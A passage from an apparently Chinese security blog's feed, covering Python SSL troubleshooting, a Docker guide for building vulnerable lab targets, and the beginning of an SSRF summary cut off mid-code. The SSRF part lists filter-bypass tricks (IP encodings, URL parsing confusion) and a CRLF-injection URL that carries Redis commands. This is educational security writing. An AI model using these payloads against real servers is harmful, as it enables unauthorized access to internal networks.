CPPFLAGS=&quot;-I/usr/local/opt/openssl/include&quot;</span><br><span class="line"></span><br><span class="line">For pkg-config to find openssl you may need to set:</span><br><span class="line">  export PKG_CONFIG_PATH=&quot;/usr/local/opt/openssl/lib/pkgconfig&quot;</span><br></pre></td></tr></table></figure><p>尝试手动创建软连接，通过 brew 安装的 OpenSSL 的头文件位于 /usr/local/Cellar/openssl/1.0.2q/include/openssl 文件夹内，在终端内执行：</p><p><code>ln -s /usr/local/Cellar/openssl/1.0.2q/include/openssl /usr/local/include</code></p><p>又设置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ export CFLAGS=&quot;-I/usr/local/opt/openssl/include&quot;</span><br><span class="line">$ export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib&quot;</span><br></pre></td></tr></table></figure><p>在编译时设置 LDFLAGS 与 CPPFLAGS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure CPPFLAGS=&quot;-I/usr/local/opt/openssl/include&quot; LDFLAGS=&quot;-L/usr/local/opt/openssl/lib&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>依然无法解决问题</p><p><strong>最终想起</strong>很久之前python3是用python-3.7.2-macosx10.9 02-30-21-902.pkg这种安装器装的</p><p>然后我抱着试试的心态，通过python3的installer安装路径为/Library/Frameworks/Python.framework/Versions/3.7/bin/python3</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SslNotAvailable.assets/5c68592e5fe70.png" alt></p><p>解决了，WTF</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SslNotAvailable.assets/5c692511ea73e.png" alt></p><p><strong>原来是 installer 包含了 private copies of OpenSSL 1.1.0</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近重装了macOS，半夜用python3发现这问题，结果弄到两点半。。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://j0k3r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Docker 靶机搭建</title>
    <link href="http://j0k3r.top/2019/02/10/docker-notes/"/>
    <id>http://j0k3r.top/2019/02/10/docker-notes/</id>
    <published>2019-02-09T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:30.533Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前因为出题和测试，也会些 Docker，但本文将进行一个更系统、详细的学习</p></blockquote><a id="more"></a><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong>Linux</strong></p><p><code>sudo apt-get install docker.io</code></p><p><strong>MacOS</strong></p><p>官网下载，目前最新是 Docker Desktop</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/docker-notes.assets/5c499e0905600.png" alt="d4"></p><p><strong>Windows</strong></p><p>需开启Hyper-V，然后下载 Docker Desktop for windows 安装</p><p><strong>添加国内镜像源</strong></p><p>在registry-mirrors中添加<a href="https://registry.docker-cn.com，或者使用阿里云镜像加速" target="_blank" rel="noopener">https://registry.docker-cn.com，或者使用阿里云镜像加速</a></p><h3 id="0x01-拉取镜像测试与基本命令"><a href="#0x01-拉取镜像测试与基本命令" class="headerlink" title="0x01 拉取镜像测试与基本命令"></a>0x01 拉取镜像测试与基本命令</h3><p>安装好Docker后</p><p>可以使用<code>docker search</code>在Docker Hub搜索需要的镜像，然后<code>docker pull</code>拉取下来，就可以在<code>docker images</code>里看到刚才pull的镜像了</p><p>接着使用run在<strong>新容器</strong>中使用一个命令, 比如</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/docker-notes.assets/5c498ca985c9c.png" alt="d1"></p><p><code>-t</code> 分配一个伪TTY</p><p><code>-i</code> 保持STDIN打开, 即交互模式</p><p>注意run和exec的区别，他们都是运行一个命令，但exec是在running container中使用</p><p><code>docker ps -n 2 -s</code> 查看最近2个运行的容器以及大小</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/docker-notes.assets/5c4991871702e.png" alt="d2"></p><p><code>docker ps -a -q</code> 列出全部运行容器ID</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/docker-notes.assets/5c4992682df8d.png" alt="d3"></p><p><strong>其他常用命令</strong></p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>docker –help/-h</td><td>查看帮助</td></tr><tr><td>docker attach</td><td>直接与容器交互，但必须是running container</td></tr><tr><td>docker rm</td><td>删除容器</td></tr><tr><td>docker rmi</td><td>删除镜像</td></tr><tr><td>docker stop [id]</td><td>停止该容器</td></tr><tr><td>docker start [id]</td><td>启动该容器</td></tr><tr><td>docker cp [id]:[path] [host path]</td><td>copy 容器内文件到主机</td></tr><tr><td>docker diff [id]</td><td>查看容器储存层的改动</td></tr></tbody></table><p><strong>注：</strong></p><p>docker commit 是对镜像的分层操作，改动仅发生在当前这层，每次commit，上一层的东西不会消失，会使镜像变得臃肿</p><h3 id="0x02-编写Dockerfile"><a href="#0x02-编写Dockerfile" class="headerlink" title="0x02 编写Dockerfile"></a>0x02 编写Dockerfile</h3><blockquote><p> Dockerfile是由一系列命令和参数构成的脚本，这些命令应用于拉取的基础镜像并最终创建一个新的镜像，通过Dockerfile我们可以创建一个你需要的镜像，里面是包含了你要安装的软件，相当于是提前定制好要安装的拓展，执行的命令等，然后一键执行，极大地简化操作流程</p></blockquote><p>当 Docker Hub 上的镜像无法直接满足需求时，通常用 Dockerfile 来定制镜像以满足不同场合的需求</p><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>Dockerfile 第一条指令<strong>必须</strong>是FROM指定基础镜像，这里的镜像一般都是能 docker search 到的</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &quot;&lt;?php echo &apos;It&apos;s work!&apos;; ?&gt;&quot; &gt; /usr/share/nginx/html/index.php</span><br></pre></td></tr></table></figure><p><strong>Docker Hub 上一些高质量官方镜像：</strong></p><p>nginx、redis、mongo、mysql、httpd、php、tomcat</p><p>node、openjdk、python、ruby、golang … …</p><p><strong>基础的操作系统镜像:</strong></p><p>ubuntu、debian、centos、fedora、alpine … ….</p><p><strong>空白镜像：</strong></p><p>scratch</p><p>如 ：<code>FROM scratch</code>, 表示不需要有操作系统提供运行时支持，接下来所写的指令将作为镜像第一层，比较适合 Linux 下静态编译的程序，如Go语言开发</p><h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p>RUN 其实就是执行shell命令，有点像写shell脚本</p><p>需要注意的是每一个RUN相当于commit新建一层镜像，这就容易造成上文说的镜像臃肿，要么删掉垃圾文件，要么尽量使用更少的RUN</p><p>如以下格式安装Apache+PHP+Mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get update \</span><br><span class="line">&amp;&amp; apt-get upgrade \</span><br><span class="line">&amp;&amp; apt-get install apache2 php7.2 libapache2-mod-php7.2 \</span><br><span class="line">&amp;&amp; apt-get install mysql-server \</span><br><span class="line">&amp;&amp; apt-get install php7.2-curl \</span><br><span class="line">&amp;&amp; chmod 777 /var/www/html</span><br></pre></td></tr></table></figure><p><code>\</code> 表换行，<code>&amp;&amp;</code> 连接命令</p><h4 id="CPOPY-amp-ADD"><a href="#CPOPY-amp-ADD" class="headerlink" title="CPOPY &amp; ADD"></a>CPOPY &amp; ADD</h4><p>两者都可以将主机上的资源复制或加入到容器镜像，区别是ADD可以通过URL读取网络资源复制到镜像内，且ADD会自解压源归档文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR /var/www/html</span><br><span class="line">COPY [&quot;test/&quot;, &quot;.&quot;] #写法一</span><br><span class="line">COPY test/ .        #写法二</span><br><span class="line">ADD pkg.tar /pkg</span><br></pre></td></tr></table></figure><p>#### </p><p><strong>添加.dockerignore文件让Docker忽视一些目录或文件</strong></p><p>规则与shell的通配符类似，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 注释</span><br><span class="line">/tmp/log*</span><br><span class="line">*/log*</span><br><span class="line">log*</span><br></pre></td></tr></table></figure><p>构建好镜像就可以run了,比如</p><p><code>docker run -p 7778:80 -d php:php1</code></p><h3 id="Compose"><a href="#Compose" class="headerlink" title="Compose"></a>Compose</h3><p>很多概念最好到《Docker —— 从入门到实践》的gitbook或Docker官方文档学习</p><p>一个容器中最好只运行一个主进程，如两个容器分别运行apache、mysql以提高整体效率，简化部署工作量。这时就需要 Compose 通过默认名为docker-compose.yml 的 Compose file 定义一组相关联的应用容器为一个项目以便管理。</p><p>docker compose file有1、2、2.x和3.x版本，部分语法支持程度不同</p><p>比如在 Compose file 中设置 networks 指定ip 要使用2.x版本，下面是我的一个示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2.1&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    command: --default-authentication-plugin=mysql_native_password</span><br><span class="line">    container_name: mysql</span><br><span class="line">    volumes:</span><br><span class="line">      - ./db/database:/var/lib/mysql</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;33070:3306&quot;</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=1qaz2wsx</span><br><span class="line">    networks:</span><br><span class="line">      vpcbr:</span><br><span class="line">        ipv4_address: 10.3.0.3</span><br><span class="line"></span><br><span class="line">  web:</span><br><span class="line">    #image: php:7.2.2-apache</span><br><span class="line">    build: .</span><br><span class="line">    container_name: php_7.2.2_apache_For_web_chou</span><br><span class="line">    volumes:</span><br><span class="line">      - ./html:/var/www/html/</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;12345:80&quot;</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_USER=chou</span><br><span class="line">      - MYSQL_PASSWORD=1qaz2wsx</span><br><span class="line">      - PHP_TZ=Asia/Shanghai</span><br><span class="line">    networks:</span><br><span class="line">      vpcbr:</span><br><span class="line">        ipv4_address: 10.3.0.2</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  vpcbr:</span><br><span class="line">    driver: bridge</span><br><span class="line">    ipam:</span><br><span class="line">      driver: default</span><br><span class="line">      config:</span><br><span class="line">       - subnet: 10.3.0.0/16</span><br></pre></td></tr></table></figure><p>指定ip其实有些麻烦，可以使用link，具体见<a href="https://yq.aliyun.com/articles/55912" target="_blank" rel="noopener">深入理解docker的link机制</a>,其实就是通过改hosts确定容器地址，还有一些环境变量之类的功能</p><p>但有时候link不好使，也可以指定ip，桥接到主机的物理网卡</p><p>出现<code>ERROR: Pool overlaps with other one on this address space</code>是因为目标网段已经存在，删除网段对应的网卡或更改subnet网段地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br><span class="line">列出docker网卡信息</span><br><span class="line"></span><br><span class="line">docker network rm 网卡id</span><br><span class="line">删除指定的docker网卡</span><br><span class="line"></span><br><span class="line">docker network inspect 网卡id</span><br><span class="line">查看该docker网卡的配置信息</span><br></pre></td></tr></table></figure><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>compose build</td><td>(构建yml中某个服务的镜像)</td></tr><tr><td>compose ps</td><td>(查看已经启动的服务状态）</td></tr><tr><td>compose kill</td><td>(停止某个服务）</td></tr><tr><td>compose logs</td><td>(可以查看某个服务的log）</td></tr><tr><td>compose port</td><td>(打印绑定的public port）</td></tr><tr><td>compose pull</td><td>(pull服务镜像)</td></tr><tr><td>compose up</td><td>(启动yml定义的所有服务）</td></tr><tr><td>compose stop</td><td>(停止yml中定义的所有服务）</td></tr><tr><td>compose start</td><td>(启动被停止的yml中的所有服务）</td></tr><tr><td>compose kill</td><td>(强行停止yml中定义的所有服务）</td></tr><tr><td>compose rm</td><td>（删除yml中定义的所有服务）</td></tr><tr><td>compose restart</td><td>(重启yml中定义的所有服务）</td></tr><tr><td>compose scale</td><td>(扩展某个服务的个数，可以向上或向下）</td></tr><tr><td>compose migrate-to-labels</td><td>(这个没有实际尝试。根据介绍是将服务从1.2迁移到1.3带labels的版本。docker之前不支持label）</td></tr><tr><td>compose version</td><td>（查看compose的版本）</td></tr></tbody></table><p>Reference：</p><p><a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p><a href="https://docs.docker.com" target="_blank" rel="noopener">https://docs.docker.com</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前因为出题和测试，也会些 Docker，但本文将进行一个更系统、详细的学习&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Docker" scheme="http://j0k3r.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>SSRF小结</title>
    <link href="http://j0k3r.top/2019/01/30/SSRF/"/>
    <id>http://j0k3r.top/2019/01/30/SSRF/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2020-03-26T11:04:17.185Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>即恶意使用Web应用作为代理攻击其他本地或远程服务器的攻击方法，称其为服务端请求伪造攻击（Server-side Request Forgery），常用来探测内网，攻击内网应用</p></blockquote><a id="more"></a><h2 id="后端实现与出现场景"><a href="#后端实现与出现场景" class="headerlink" title="后端实现与出现场景"></a>后端实现与出现场景</h2><h3 id="PHP常见有三种"><a href="#PHP常见有三种" class="headerlink" title="PHP常见有三种"></a>PHP常见有三种</h3><ul><li>file_get_contents </li></ul><p>file_get_contents也可以直接获取用户指定URL的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$homepage = file_get_contents(<span class="string">'http://www.example.com/'</span>);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>fsockopen</li></ul><p>fsockopen — 打开一个网络连接或者一个Unix套接字连接，跟服务器建立tcp连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fsockopen(<span class="string">"www.example.com"</span>, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$errstr ($errno)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">"GET / HTTP/1.1\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Host: www.example.com\r\n"</span>;</span><br><span class="line">    $out .= <span class="string">"Connection: Close\r\n\r\n"</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>curl_exec</li></ul><p>执行 cURL 会话，注意cURL的版本，低版本往往有很多bypass方法，后文有提到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.example.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Python的urllib库"><a href="#Python的urllib库" class="headerlink" title="Python的urllib库"></a>Python的urllib库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">info = urllib.urlopen(url)</span><br><span class="line">print(info)</span><br></pre></td></tr></table></figure><p>前几年，存在urllib http头注入漏洞，借此可以实现对内网未授权仿问的redis服务器getshell</p><p>原理是HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p><p>就像:<code>http://127.0.0.1%0d%0aset%20some%20bad%0d%0a:6399/</code>执行redis命令</p><h3 id="出现场景"><a href="#出现场景" class="headerlink" title="出现场景"></a>出现场景</h3><ol><li><p>社交分享功能：获取超链接的标题等内容进行显示</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译：给网址翻译对应网页的内容</p></li><li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p></li><li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p></li><li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p></li><li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p></li><li><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li></ol><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="0x01-IP进制转换"><a href="#0x01-IP进制转换" class="headerlink" title="0x01 IP进制转换"></a>0x01 IP进制转换</h3><table><thead><tr><th>内网IP段</th><th></th></tr></thead><tbody><tr><td>127.0.0.0/8</td><td>127.0.0.0 ~ 127.255.255.255</td></tr><tr><td>192.168.0.0 /16</td><td>192.168.0.0 ~ 192.168.255.255</td></tr><tr><td>10.0.0.0/8</td><td>10.0.0.0 ~ 10.255.255.255</td></tr><tr><td>172.16.0.0/12</td><td>172.16.0.0 ~ 172.31.255.255</td></tr></tbody></table><p>之前WordPress &lt;4.5 的SSRF就是利用ip转为八进制来访问内网</p><p>如192.168.0.1 可转换为</p><p>8 进制格式：0300.0250.0.1</p><p>16 进制格式：0xC0.0xA8.0.1</p><p>10 进制整数格式：3232235521</p><p>16 进制整数格式：0xC0A80001 </p><p>还有一种特殊的<strong>省略模式</strong>，例如10.0.0.1这个 IP 可以写成10.1</p><p>转10进制整数IP略麻烦，可用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">int_ip = <span class="string">''</span></span><br><span class="line">i = ip.split(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">for</span> ii <span class="keyword">in</span> i:</span><br><span class="line">t = str(bin(int(ii)))[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">int_ip += t</span><br><span class="line"><span class="keyword">print</span> str(int(int_ip,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="0x02-URL解析绕过"><a href="#0x02-URL解析绕过" class="headerlink" title="0x02 URL解析绕过"></a>0x02 URL解析绕过</h3><p>URL语法：</p><p><code>&lt;scheme&gt;://&lt;username&gt;:&lt;passwd&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</code></p><ol><li><p>指向任意 ip 的域名xip.io, <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a></p></li><li><p><a href="http://www.baidu.com@127.0.0.1/或http://www.baidu.com#127.0.0.1/" target="_blank" rel="noopener">http://www.baidu.com@127.0.0.1/或http://www.baidu.com#127.0.0.1/</a></p></li><li><p>短网址 <a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p></li><li><p>句号绕过 127。0。0。1</p></li><li><p>Enclosed alphanumerics绕过</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="0x03-parse-url与libcurl对curl的解析差异"><a href="#0x03-parse-url与libcurl对curl的解析差异" class="headerlink" title="0x03 parse_url与libcurl对curl的解析差异"></a>0x03 parse_url与libcurl对curl的解析差异</h3><p>geek game之前一道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//error_reporting(E_ALL); </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        dir(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//var_dump($hostname); </span></span><br><span class="line"></span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125; </span><br><span 